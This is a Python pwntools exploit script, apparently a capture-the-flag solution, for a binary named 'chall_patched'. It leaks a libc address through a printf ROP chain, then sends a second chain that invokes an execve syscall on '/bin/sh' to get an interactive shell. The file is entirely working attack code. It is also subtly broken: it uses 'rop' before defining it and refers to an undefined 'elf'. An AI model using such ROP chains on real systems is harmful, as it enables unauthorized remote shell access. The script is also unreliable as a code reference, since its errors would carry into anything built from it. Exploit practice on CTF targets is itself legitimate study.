#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    sleep(10)
    payload = p64(rop.ret.address) * 30 + p64(elf.plt['printf']) + p64(elf.sym['_start'])
    r.sendlineafter(b'>> ', payload)

    libc.address = u64(r.recv(6).ljust(8, b'\0')) - libc.sym['funlockfile']
    log.info(f"{hex(libc.address)}")
    rop = ROP(libc)
    rop.raw(p64(rop.ret.address) * 23)
    rop(rdi=next(libc.search(b'/bin/sh\x00')), rsi=0, rdx=0, rax=0x3b)
    rop.call(rop.find_gadget(['syscall', 'ret'])[0])    
    r.sendlineafter(b'>> ', rop.chain())

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
